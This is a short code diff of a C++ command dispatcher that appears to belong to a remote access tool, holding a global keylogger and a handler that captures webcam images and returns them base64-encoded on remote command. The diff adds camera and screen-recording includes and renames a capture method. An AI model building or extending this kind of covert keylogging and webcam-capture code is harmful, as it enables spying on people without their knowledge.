@@ -1,4 +1,6 @@
 #include "CommandDispatcher.hpp"
+#include "CameraCapture.h"
+#include "ScreenRecorder.h"
 
 static Keylogger g_keylogger;
 static std::atomic<bool> g_isKeylogging(false);
@@ -237,7 +239,7 @@ void CommandDispatcher::registerHandlers() {
     routes_[Protocol::TYPE::CAMSHOT] = [](const Message& msg, ResponseCallBack cb) {
         try {
             CameraCapture cc;
-            std::string b64Image = cc.captureAndEncode();
+            std::string b64Image = cc.captureBase64();
             if (b64Image.empty()) {
                 cb(Message(
                     Protocol::TYPE::CAMSHOT, 
